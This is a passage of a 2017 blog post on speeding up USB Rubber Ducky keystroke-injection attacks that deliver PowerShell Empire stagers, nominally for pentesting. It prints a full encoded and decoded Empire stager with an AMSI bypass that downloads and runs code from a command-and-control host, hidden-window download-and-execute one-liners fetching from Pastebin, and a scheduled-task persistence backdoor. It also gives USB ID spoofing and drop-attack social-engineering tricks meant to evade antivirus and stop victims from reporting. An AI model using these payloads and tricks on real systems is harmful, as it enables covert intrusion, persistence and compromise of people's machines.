The Watergate often uses the Ducky as a physical clipboard to paste stager text into the victim machine.</p><p style="margin-left:40px"><strong>Pros:</strong> All the time in the world.</p><p style="margin-left:40px"><strong>Cons:</strong> Not nearly as commonly in scope in pentests. And, as always, sucks to get caught.</p><p>The two most commonly used methodologies, The Sneak and The Drop, need two things to be successful: speed and believability. So, let's first get a baseline and then optimize the delivery of an Empire stager to minimize execution time and keep the user as unaware as possible.</p></div></div><div class="sqs-block horizontalrule-block sqs-block-horizontalrule" data-block-type="47" id="block-yui_3_17_2_12_1500057677565_183083"><div class="sqs-block-content"><hr /></div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-yui_3_17_2_12_1500057677565_183145"><div class="sqs-block-content"><h1>Baseline: Standard Methodology</h1><p>For information on creating Empire stagers, see <a target="_blank" href="https://www.powershellempire.com/?page_id=104">Stagers 101</a>.</p><p>Using Empire's stager/windows/ducky, we get the following results:</p><pre>DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING powershell -W Hidden -nop -noni -enc WwBSAGUAZgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAVABGAGkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBsAFUAZQAoACQAbgBVAEwAbAAsACQAdABSAFUAZQApAH0AOwBbAFMAeQBTAFQAZQBtAC4ATgBFAFQALgBTAGUAcgB2AGkAQwBFAFAAbwBJAE4AdABNAEEATgBBAEcAZQBSAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMATwBOAFQASQBOAFUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBiAEoAZQBDAFQAIABTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AGMALgBIAGUAQQBkAEUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAEUAQgBSAEUAUQB1AGUAcwBUAF0AOgA6AEQARQBGAGEAdQBMAHQAVwBFAEIAUAByAE8AeAB5ADsAJABXAEMALgBQAFIAbwBYAFkALgBDAFIARQBkAGUAbgB0AEkAQQBMAFMAIAA9ACAAWwBTAHkAcwBUAEUATQAuAE4ARQB0AC4AQwByAEUARABlAE4AdABpAEEAbABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAEwAVABOAEUAVABXAE8AUgBrAEMAUgBFAEQAZQBOAHQASQBhAGwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAEMATwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQB0AEUAcwAoACcAYwBJAHAAMABDADwASgAtAHMAbABUAF8AXgBAAGkANABQAEcALAA4AHgAWABGACsAZgBFAFIAMwB2AEQAfgBkACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABlAGEAZABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AeABiADEAcgBKAGoATABuAGwANQBKAGsAMABqADEATgAxAFYAZABoAHgAZwByAE8ANgArAFkAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMgA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABEAGEAVABBAD0AJABXAEMALgBEAE8AdwBOAGwAbwBhAGQARABhAFQAYQAoACQAcwBlAFIAKwAkAHQAKQA7ACQAaQBWAD0AJABEAEEAdABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAEEAdABBAFsANAAuAC4AJABEAGEAdABhAC4ATABFAG4ARwB0AEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
+ENTER</pre><p><strong>Time to complete</strong>:&nbsp;Approx.&nbsp;<strong>38 seconds</strong><br /><strong>Input characters</strong>: 1 (r) + 10 (powershell) + 1 (ENTER) + 2657 (payload) + 1 (ENTER) =&nbsp;<strong>2670 Characters</strong></p><p>The first problem we run into is the driver issue. Most boxes have never seen a Ducky (or that particular VID/PID) before, so you have to assume that the driver loading will be a part of the real-world execution time.</p><p>At first glance, we could try shaving off time by launching the base64 encoded command directly from the 'Run'&nbsp;box, however this is not possible as the box will not accept this many characters.</p><p>We can do better...</p></div></div><div class="sqs-block horizontalrule-block sqs-block-horizontalrule" data-block-type="47" id="block-yui_3_17_2_12_1500057677565_154359"><div class="sqs-block-content"><hr /></div></div><div class="sqs-block code-block sqs-block-code" data-block-type="23" id="block-yui_3_17_2_12_1500057677565_204079"><div class="sqs-block-content"><h1 id="the_sneak">
+  The Sneak: Pastebin Execution in 3 Seconds
+</h1></div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-yui_3_17_2_12_1500057677565_154422"><div class="sqs-block-content"><h3>Step 1: Base64 decode the stager</h3><pre style="margin-left:40px">$ <strong>echo "WwBSAEUARgBdAC4AQQBTAFMAZ...ACkAfABJAEUAWAA=" | base64 -d</strong>
+[REF].ASSemBLY.GetType('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFieLd('amsiInitFailed','NonPublic,Static').SeTVaLUE($NULl,$TruE)};[SYStEm.NeT.SeRvIcEPoIntMaNager]::EXPEcT100CoNtiNUe=0;$WC=New-ObjeCT SysTeM.NeT.WebCLIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRs.ADD('User-Agent',$u);$WC.ProXy=[SystEm.NEt.WeBREqueSt]::DEfaULtWeBPRoXy;$wC.PRoXY.CreDENTIALS = [SYStEm.Net.CreDEnTIAlCaChe]::DEFAUltNEtworKCredENtIALS;$K=[SysTeM.TExT.ENcODING]::ASCII.GetBytES('cIp0C&lt;J-slT_^@i4PG,8xXF+fER3vD~d');$R={$D,$K=$ARGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CouNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};$Wc.HEadERs.ADD("Cookie","session=yf4qx5Kgt/VLttX7JIdbgtni/iQ=");$ser='http://192.168.1.2:80';$t='/login/process.php';$daTa=$WC.DOWNLOAdDAta($ser+$t);$Iv=$dAta[0..3];$DaTa=$daTA[4..$dAta.leNGTh];-JoiN[ChAr[]](&amp; $R $DaTA ($IV+$K))|IEX
+</pre><p style="margin-left:40px">Alternatively, you can re-generate the stager using Empire's multi/launcher with the Base64 option set to False.</p><h3>Step 2: Upload the stager to pastebin</h3><p style="margin-left:40px">Copy and paste the Base64 decoded PowerShell to <a target="_blank" href="https://pastebin.com/">Pastebin</a> and <strong>save the raw path</strong>. Make sure to use the secure <strong>https</strong> link to help avoid detection.</p><p style="margin-left:40px">For example, see <a target="_blank" href="https://pastebin.com/raw/ani8ic5X">https://pastebin.com/raw/ani8ic5X</a></p><h3>Step 3:&nbsp;Create a PowerShell one-liner to launch stager</h3><pre style="margin-left:40px">powershell -ep bypass -w h -c "IEX (New-Object Net.WebClient).DownloadString('<strong>https://pastebin.com/raw/ani8ic5X</strong>')"</pre><p style="margin-left:40px">We use the minimal options '-ep bypass' to bypass the execution policy and '-w h' to hide the PowerShell window from the user.</p><h3>Step 4:&nbsp;Play with the timings</h3><p style="margin-left:40px">The default Empire timings (3000 and 1000) are very conservative.&nbsp;Through some experimentation on different systems, these can be pushed to:</p><pre style="margin-left:40px">DELAY <strong>500</strong>
+GUI r
+DELAY <strong>100</strong>
+</pre><h3>Step 5: Cloak the USB VID &amp; PID</h3><p style="margin-left:40px">To further hide the Ducky, it is necessary to modify the USB Vendor ID (VID) and Product ID (PID). As we are just performing keyboard injection, let's spoof the Microsoft (0x045E) Generic 'Keyboard' (0xFFF8). You can <a target="_blank" href="/s/msft-vidpid.bin">download the Microsoft vidpid.bin file here </a>and copy it as vidpid.bin to the root directory of the Ducky.</p><pre style="margin-left:40px">$ <strong>cp msft-vidpid.bin /media/PATH/TO/DUCKY</strong><strong>/vidpid.bin</strong>
+</pre><h3>STEP 6: PUTTING IT ALL TOGETHER</h3><p style="margin-left:40px"><strong>Time to complete</strong>: Approx. <strong>3</strong><strong>&nbsp;seconds</strong><br /><strong>Input characters</strong>: 1 (r) + 114 (payload)+ 1 (ENTER) =&nbsp;<strong>116 Characters</strong></p><pre style="margin-left:40px">DELAY 500
+GUI r
+DELAY 100
+STRING powershell -ep bypass -w h -c "IEX (New-Object Net.WebClient).DownloadString('<strong>https://pastebin.com/raw/ani8ic5X</strong>')"
+ENTER
+</pre><p style="margin-left:40px"><a target="_blank" href="/s/pastebin-payload.txt">Download pastebin-payload.txt</a> and remember to swap out the Pastebin link with your own.</p><p style="margin-left:40px">Compile the ducky payload (read <a target="_blank" href="http://usbrubberducky.com/">the Rubber Ducky wiki</a>&nbsp;for more information):</p><pre style="margin-left:40px">$ <strong>java -jar duckencoder.jar -i pastebin-payload.txt -o </strong><strong>/media/PATH/TO/DUCKY</strong><strong>/inject.bin</strong>
+</pre></div></div><div class="sqs-block horizontalrule-block sqs-block-horizontalrule" data-block-type="47" id="block-yui_3_17_2_12_1500057677565_145803"><div class="sqs-block-content"><hr /></div></div><div class="sqs-block code-block sqs-block-code" data-block-type="23" id="block-yui_3_17_2_12_1500057677565_222885"><div class="sqs-block-content"><h1 id="the_drop">
+  The Drop: Adding Believability
+</h1></div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-yui_3_17_2_12_1500057677565_145865"><div class="sqs-block-content"><p>Because The Drop involves the victim actually interacting with the Ducky, the attack must be both discrete and convincing. We're going to use the same Pastebin delivery system as The Sneak, but first we have to prepare the Ducky to appear as a USB drive.</p><h3>Step 1: Flash Rubber Ducky firmware to TWIN Duck</h3><p style="margin-left:40px">Erase and flash the Ducky firmware to the Twin Duck firmware (<a target="_blank" href="https://github.com/hak5darren/USB-Rubber-Ducky/blob/master/Firmware/Images/">c_duck_v2.1.hex</a>, at the time of this article).<br />For more comprehensive flashing instructions, visit the <a target="_blank" href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Flashing-ducky">Ducky Wiki on Flashing</a>.</p><p style="margin-left:40px">1. Install dfu-programmer:</p><pre style="margin-left:40px">$ <strong>sudo apt-get update &amp;&amp; sudo apt-get install dfu-programmer</strong></pre><p style="margin-left:40px">2. <strong>Remove Ducky's flash card</strong> and insert the Ducky into your host machine <strong>with the button pressed</strong>.</p><p style="margin-left:40px">3. Erase the current firmware:</p><pre style="margin-left:40px">$ <strong>sudo dfu-programmer at32uc3b1256 erase</strong></pre><p style="margin-left:40px">4. Update the firmware to Twin Duck:</p><pre style="margin-left:40px">$ <strong>sudo dfu-programmer at32uc3b1256 flash --suppress-bootloader-mem c_duck_v2.1.hex</strong></pre><p style="margin-left:40px">5. Reset to Ducky to get to working again:</p><pre style="margin-left:40px">$ <strong>sudo dfu-programmer at32uc3b1256 reset</strong>
+</pre><h3>Step 2: Cloak the USB VID &amp; PID</h3><p style="margin-left:40px">In this case, let's emulate one of the most common USB flash drive chipsets: Alcor Micro Corp's (0x058F) generic 'Flash Drive' (0x6387). You can <a target="_blank" href="/s/alcor-vidpid.bin">download a custom-built Alcor Micro vidpid.bin file</a> and copy it to the Ducky.</p><pre style="margin-left:40px">$ <strong>cp alcor-vidpid.bin /media/PATH/TO/DUCKY</strong><strong>/vidpid.bin</strong>
+</pre><h3>Step 3: Choose a story for your drive</h3><p style="margin-left:40px">Was this drive dropped by the CFO of the target company? Is it the personal drive of a college intern? The drive's story will inform your decisions in the next steps, so pick a narrative and stick to it.</p><h3>Step 4: Add Drive Label</h3><p style="margin-left:40px">The easiest way to add a label to a FAT16 drive in Linux is to use <a target="_blank" href="http://gparted.org/">GParted</a>.</p><p style="margin-left:40px">1.&nbsp;Load the MicroSD Card through a reader.<br />2. Launch GParted and switch to the USB drive (often /dev/sdb)<br />3.&nbsp;Unmount the drive (Partition -&gt; Unmount)<br />4.&nbsp;Right click and go to 'Label File System' and <strong>choose a label in line with your drive's story</strong><br />5.&nbsp;Click 'Apply'</p><h3>Step 5: Further trickery</h3><p style="margin-left:40px">The main goal for The Drop is to avoid users freaking out when they see commands being entered into their computer and calling IT or, even worse, unpluging the ethernet or power. (It happens!) An engaging user experience can make up for some "quirkiness" with the USB drive.&nbsp;</p><ul style="margin-left:40px"><li><strong>Add dummy content</strong> inside the drive (pictures, documents, etc.) and make it believable. (<em>SocEng side note</em>: Adding NSFW content makes it less likely that the victim will turn the drive into their IT department.)<br /> </li><li><strong>Make 'inject.bin' and 'vidpid.bin'&nbsp;hidden</strong> on Windows systems. You can use <em>wine attrib +h FILENAME</em> for this, but I have found it much more reliable to load the SD card onto a Windows box and make the files hidden manually.</li></ul><h3>Step 6: Set up Injection using the <a href="#the_sneak">above Pastebin method</a></h3></div></div><div class="sqs-block horizontalrule-block sqs-block-horizontalrule" data-block-type="47" id="block-yui_3_17_2_12_1500057677565_155592"><div class="sqs-block-content"><hr /></div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-yui_3_17_2_12_1500057677565_155654"><div class="sqs-block-content"><h1>Air Gapped Systems and Offline Laptops: Execute from Storage</h1><p style="margin-left:40px">Not only do we have space on the Ducky's USB storage to create a convincing and interesting experience for the user,&nbsp;but we also have a launching ground to execute larger payloads. In this example, we are going to build a payload designed to compromise offline laptops and air gapped systems (if they are ever re-connected to the network temporarily). Of course, this payload is just a PoC and can easily be swapped out with a more comprehensive PowerShell rootkit. Since many steps are the same as above, I will only point out the changes in each.</p><h3>Step 1: Flash Rubber Ducky firmware to TWIN Duck</h3><h3>Step 2: Add Drive Label</h3><p style="margin-left:40px">Let's label the drive DUCKY for this example.</p><h3>Step 3: Base64 decode the empire stager and upload it to pastebin</h3><h3>Step 4: Create a scheduled task in powershell</h3><p style="margin-left:40px">In backdoor.ps1 (<a target="_blank" href="/s/backdoor.ps1">download here</a>):</p><pre style="margin-left:40px">$PScommand = 'powershell -ep bypass -w h -enc '
+$IEXPayload = "IEX (New-Object Net.WebClient).DownloadString('<strong>https://pastebin.com/raw/ani8ic5X</strong>')"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($IEXPayload)
+$encCommand = [Convert]::ToBase64String($bytes)
+$null = schtasks /Create /SC <strong>MINUTE</strong> /TN Updater /TR "$PScommand $encCommand"
+</pre><p style="margin-left:40px"><strong>Note:</strong>&nbsp;In this example, the script is set to check for internet access every 60 seconds, however, in real-world scenarios, it is best to have the stager check every few hours or even once a day.</p><h3>Step 5: Load backdoor.ps1 onto the Rubber Ducky</h3><p style="margin-left:40px">To further reduce the number of characters Ducky needs to type, we will rename the backdoor to 'b.ps1'.</p><pre style="margin-left:40px">$ <strong>cp </strong><strong>backdoor.ps1 </strong><strong>/media/PATH/TO/DUCKY/b.ps1</strong>
+
+</pre><h3>Step 6: Create a PowerShell one-liner to launch the backdoor</h3><p style="margin-left:40px">The tricky part here is finding on which letter drive the DUCKY SD card has mounted. This one-liner first finds the drive labeled 'DUCKY', extracts the letter of that drive, appends the PowerShell file to the string and executes the script.</p><p style="margin-left:40px"><strong>Windows 7-10 (gwmi method) - 104 Characters</strong></p><pre style="margin-left:40px">powershell -ep bypass -w h -c ".(((gwmi Win32_Volume | ? {$_.Label -eq 'DUCKY'}).DriveLetter)+'\b.ps1')"</pre><p style="margin-left:40px"><strong>Windows 8-10 (Get-Volume method) - 94 Characters</strong></p><pre style="margin-left:40px">powershell -ep bypass -w h -c ".(((Get-Volume -FileSystemLabel DUCKY).DriveLetter)+':\b.ps1')"
+
+</pre><h3>Step 7: Set the timings</h3><pre style="margin-left:40px">DELAY <strong>2800</strong>
+GUI r
+DELAY <strong>150</strong>
+
+</pre><h3>Step 8: Cloak the USB VID &amp; PID</h3><p style="margin-left:40px">Let's again spoof the Alcor Micro Corp's (0x058F) generic 'Flash Drive' (0x6387), which can be <a target="_blank" href="/s/alcor-vidpid.bin">downloaded here</a>.</p><pre style="margin-left:40px">$ <strong>cp alcor-vidpid.bin /media/PATH/TO/DUCKY</strong><strong>/vidpid.bin</strong>
+</pre><h3>Step 9: Putting it all together (get-volume method)</h3><p style="margin-left:40px"><strong>Time to complete</strong>: Approx. <strong>9 seconds</strong><br /><strong>Input characters</strong>: 1 (r) + 94 (payload)+ 1 (ENTER) = <strong>96</strong><strong>&nbsp;Characters</strong></p><pre style="margin-left:40px">DELAY 2800
+GUI r
+DELAY 150
+STRING powershell -ep bypass -w h -c ".(((Get-Volume -FileSystemLabel DUCKY).DriveLetter)+':\b.ps1')"
+ENTER
+</pre><p style="margin-left:40px">Download the <a target="_blank" href="/s/getvolume-payload.txt">Get-Volume payload here</a>. You can also download the <a target="_blank" href="/s/gwmi-payload.txt">gwmi version here</a>.</p><h1>Conclusion</h1><p style="margin-left:40px">We started with the default Empire Ducky script, which had 2,670 characters and took 38 seconds to execute. We optimized our delivery to use a web-based Empire stager, which brings execution time down to 3 seconds, with only 116 input characters. At a 3 second execution time, The Sneak becomes a feasible attack vector, provided the attacker has access to the USB ports.&nbsp;We also learned about how to create an engaging and convincing user experience that is consistent with the target's expectations (or fantasies). Adding these human elements greatly lowers detection and incident reporting rates. Ultimately, <strong>targets will be more lenient if they deem the drive's reward worth the risk</strong>. Lastly, we examined a PoC of executing a script from the Ducky's internal disk, which creates a persistent session, even when the computer is not connected to the internet. This has enormous benefits when using The Drop outside of the office, where people are less likely to be connected. All of the techniques discussed here are file-less compromise methods and thus are more probable to bypass AV. To add to the attack's stealth, I encourage you to begin to use your own hosted infrastructure, rather than Pastebin, as many well-known websites are blocked in corporate environments.</p></div></div></div></div></div>
+      
+    </div>
+
+    <footer class="entry-footer clear">
+      
+      
+      <p class="entry-tags">
+        Tagged: <a href="/sc0tfree-blog/?tag=Rubber+Ducky" rel="tag">Rubber Ducky</a>, <a href="/sc0tfree-blog/?tag=PowerShell" rel="tag">PowerShell</a>, <a href="/sc0tfree-blog/?tag=Empire" rel="tag">Empire</a>, <a href="/sc0tfree-blog/?tag=USB" rel="tag">USB</a>
+      </p>
+      
+      <div class="entry-actions">
+        
+  <span class="sqs-simple-like" data-item-id="596107b472af6554d01728a6" data-like-count="13">
+    <span class="like-icon"></span>
+    <span class="like-count"></span>
+  </span>
+
+<span class="squarespace-social-buttons inline-style" data-system-data-id="1500059940277-SAG6QZUGQ1FWPADF64LV" data-asset-url="https://static1.squarespace.com/static/58d82adaa5790a257a96affe/58d84de51b10e366b42d3b4a/596107b472af6554d01728a6/1500382618121/Ducky+Pic+MASTER+v2.png" data-record-type="1" data-full-url="/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers" data-title="Real-World Rubber Ducky Attacks with Empire Stagers"></span>
+      </div>
+    </footer>
+
+    
+
+  </article>
+
+  <div id="comments-596107b472af6554d01728a6" class="p-comment">
+    
+  </div>
+
+  
+
+  
+
+</div>
+        </div><!--
+        --><aside id="rightSidebar" role="complementary">
+          <div class="sqs-layout sqs-grid-12 columns-12 open-block-field empty" data-layout-label="Blog Sidebar Content" data-type="block-field" id="blogBlocks-58d84de51b10e366b42d3b4a"><div class="row sqs-row"><div class="col sqs-col-12 span-12"></div></div></div>
+        </aside>
+        
+        
+      </main>
+
+      <div id="preFooter">
+        <div class="pre-footer-inner">
+          <div class="sqs-layout sqs-grid-12 columns-12" data-layout-label="Pre-Footer Content" data-type="block-field" data-updated-on="1491245693456" id="preFooterBlocks"><div class="row sqs-row"><div class="col sqs-col-12 span-12"><div class="sqs-block socialaccountlinks-v2-block sqs-block-socialaccountlinks-v2" data-block-type="54" id="block-yui_3_17_2_21_1491245343200_6105"><div class="sqs-block-content">
+
+<div class="sqs-svg-icon--outer social-icon-alignment-center social-icons-color-white social-icons-size-large social-icons-shape-rounded social-icons-style-knockout" >
+  <nav class="sqs-svg-icon--list">
+    <a href="mailto:henry@sc0tfree.com" target="_blank" class="sqs-svg-icon--wrapper email">
+      <div>
+        <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
+          <use class="sqs-use--icon" xlink:href="#email-icon"></use>
+          <use class="sqs-use--mask" xlink:href="#email-mask"></use>
+        </svg>
+      </div>
+    </a><a href="https://twitter.com/sc0tfree" target="_blank" class="sqs-svg-icon--wrapper twitter">
+      <div>
+        <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
+          <use class="sqs-use--icon" xlink:href="#twitter-icon"></use>
+          <use class="sqs-use--mask" xlink:href="#twitter-mask"></use>
+        </svg>
+      </div>
+    </a><a href="https://github.com/sc0tfree" target="_blank" class="sqs-svg-icon--wrapper github">
+      <div>
+        <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
+          <use class="sqs-use--icon" xlink:href="#github-icon"></use>
+          <use class="sqs-use--mask" xlink:href="#github-mask"></use>
+        </svg>
+      </div>
+    </a><a href="https://www.reddit.com/user/sc0tfree/" target="_blank" class="sqs-svg-icon--wrapper reddit">
+      <div>
+        <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
+          <use class="sqs-use--icon" xlink:href="#reddit-icon"></use>
+          <use class="sqs-use--mask" xlink:href="#reddit-mask"></use>
+        </svg>
+      </div>
+    </a><a href="https://www.linkedin.com/in/sc0tfree" target="_blank" class="sqs-svg-icon--wrapper linkedin">
+      <div>
+        <svg class="sqs-svg-icon--social" viewBox="0 0 64 64">
+          <use class="sqs-use--icon" xlink:href="#linkedin-icon"></use>
+          <use class="sqs-use--mask" xlink:href="#linkedin-mask"></use>
+        </svg>
+      </div>
+    </a>
+  </nav>
+</div></div></div></div></div></div>
+        </div>
+      </div>
+
+      <footer id="footer" role="contentinfo">
+        <div class="footer-inner">
+          <div class="nav-wrapper back-to-top-nav"><nav><div class="back-to-top"><a href="#header">Back to Top</a></div></nav></div>
+          
+
+
+          
+          <div class="sqs-layout sqs-grid-12 columns-12" data-layout-label="Footer Content" data-type="block-field" data-updated-on="1497830108153" id="footerBlocks"><div class="row sqs-row"><div class="col sqs-col-12 span-12"><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-yui_3_17_2_77_1490564082773_4049"><div class="sqs-block-content"><p class="text-align-center">Copyright 2017 sc0tfree</p></div></div></div></div></div>
+        </div>
+      </footer>
+
+    </div>
+
+    <script src="https://static1.squarespace.com/static/ta/52a74d9ae4b0253945d2aee9/1009/scripts/site-bundle.js" type="text/javascript"></script>
+    <script type="text/javascript" data-sqs-type="imageloader-bootstraper">(function() {if(window.ImageLoader) { window.ImageLoader.bootstrap({}, document); }})();</script><script>Squarespace.afterBodyLoad(Y);</script><svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="display:none"><symbol id="email-icon" viewBox="0 0 64 64"><path d="M17,22v20h30V22H17z M41.1,25L32,32.1L22.9,25H41.1z M20,39V26.6l12,9.3l12-9.3V39H20z"/></symbol><symbol id="email-mask" viewBox="0 0 64 64"><path d="M41.1,25H22.9l9.1,7.1L41.1,25z M44,26.6l-12,9.3l-12-9.3V39h24V26.6z M0,0v64h64V0H0z M47,42H17V22h30V42z"/></symbol><symbol id="twitter-icon" viewBox="0 0 64 64"><path d="M48,22.1c-1.2,0.5-2.4,0.9-3.8,1c1.4-0.8,2.4-2.1,2.9-3.6c-1.3,0.8-2.7,1.3-4.2,1.6 C41.7,19.8,40,19,38.2,19c-3.6,0-6.6,2.9-6.6,6.6c0,0.5,0.1,1,0.2,1.5c-5.5-0.3-10.3-2.9-13.5-6.9c-0.6,1-0.9,2.1-0.9,3.3 c0,2.3,1.2,4.3,2.9,5.5c-1.1,0-2.1-0.3-3-0.8c0,0,0,0.1,0,0.1c0,3.2,2.3,5.8,5.3,6.4c-0.6,0.1-1.1,0.2-1.7,0.2c-0.4,0-0.8,0-1.2-0.1 c0.8,2.6,3.3,4.5,6.1,4.6c-2.2,1.8-5.1,2.8-8.2,2.8c-0.5,0-1.1,0-1.6-0.1c2.9,1.9,6.4,2.9,10.1,2.9c12.1,0,18.7-10,18.7-18.7 c0-0.3,0-0.6,0-0.8C46,24.5,47.1,23.4,48,22.1z"/></symbol><symbol id="twitter-mask" viewBox="0 0 64 64"><path d="M0,0v64h64V0H0z M44.7,25.5c0,0.3,0,0.6,0,0.8C44.7,35,38.1,45,26.1,45c-3.7,0-7.2-1.1-10.1-2.9 c0.5,0.1,1,0.1,1.6,0.1c3.1,0,5.9-1,8.2-2.8c-2.9-0.1-5.3-2-6.1-4.6c0.4,0.1,0.8,0.1,1.2,0.1c0.6,0,1.2-0.1,1.7-0.2 c-3-0.6-5.3-3.3-5.3-6.4c0,0,0-0.1,0-0.1c0.9,0.5,1.9,0.8,3,0.8c-1.8-1.2-2.9-3.2-2.9-5.5c0-1.2,0.3-2.3,0.9-3.3 c3.2,4,8.1,6.6,13.5,6.9c-0.1-0.5-0.2-1-0.2-1.5c0-3.6,2.9-6.6,6.6-6.6c1.9,0,3.6,0.8,4.8,2.1c1.5-0.3,2.9-0.8,4.2-1.6 c-0.5,1.5-1.5,2.8-2.9,3.6c1.3-0.2,2.6-0.5,3.8-1C47.1,23.4,46,24.5,44.7,25.5z"/></symbol><symbol id="github-icon" viewBox="0 0 64 64"><path d="M32,16c-8.8,0-16,7.2-16,16c0,7.1,4.6,13.1,10.9,15.2 c0.8,0.1,1.1-0.3,1.1-0.8c0-0.4,0-1.4,0-2.7c-4.5,1-5.4-2.1-5.4-2.1c-0.7-1.8-1.8-2.3-1.8-2.3c-1.5-1,0.1-1,0.1-1 c1.6,0.1,2.5,1.6,2.5,1.6c1.4,2.4,3.7,1.7,4.7,1.3c0.1-1,0.6-1.7,1-2.1c-3.6-0.4-7.3-1.8-7.3-7.9c0-1.7,0.6-3.2,1.6-4.3 c-0.2-0.4-0.7-2,0.2-4.2c0,0,1.3-0.4,4.4,1.6c1.3-0.4,2.6-0.5,4-0.5c1.4,0,2.7,0.2,4,0.5c3.1-2.1,4.4-1.6,4.4-1.6 c0.9,2.2,0.3,3.8,0.2,4.2c1,1.1,1.6,2.5,1.6,4.3c0,6.1-3.7,7.5-7.3,7.9c0.6,0.5,1.1,1.5,1.1,3c0,2.1,0,3.9,0,4.4 c0,0.4,0.3,0.9,1.1,0.8C43.4,45.1,48,39.1,48,32C48,23.2,40.8,16,32,16z"/></symbol><symbol id="github-mask" viewBox="0 0 64 64"><path d="M0,0v64h64V0H0z M37.1,47.2c-0.8,0.2-1.1-0.3-1.1-0.8c0-0.5,0-2.3,0-4.4c0-1.5-0.5-2.5-1.1-3 c3.6-0.4,7.3-1.7,7.3-7.9c0-1.7-0.6-3.2-1.6-4.3c0.2-0.4,0.7-2-0.2-4.2c0,0-1.3-0.4-4.4,1.6c-1.3-0.4-2.6-0.5-4-0.5 c-1.4,0-2.7,0.2-4,0.5c-3.1-2.1-4.4-1.6-4.4-1.6c-0.9,2.2-0.3,3.8-0.2,4.2c-1,1.1-1.6,2.5-1.6,4.3c0,6.1,3.7,7.5,7.3,7.9 c-0.5,0.4-0.9,1.1-1,2.1c-0.9,0.4-3.2,1.1-4.7-1.3c0,0-0.8-1.5-2.5-1.6c0,0-1.6,0-0.1,1c0,0,1,0.5,1.8,2.3c0,0,0.9,3.1,5.4,2.1 c0,1.3,0,2.3,0,2.7c0,0.4-0.3,0.9-1.1,0.8C20.6,45.1,16,39.1,16,32c0-8.8,7.2-16,16-16c8.8,0,16,7.2,16,16 C48,39.1,43.4,45.1,37.1,47.2z"/></symbol><symbol id="reddit-icon" viewBox="0 0 64 64"><path 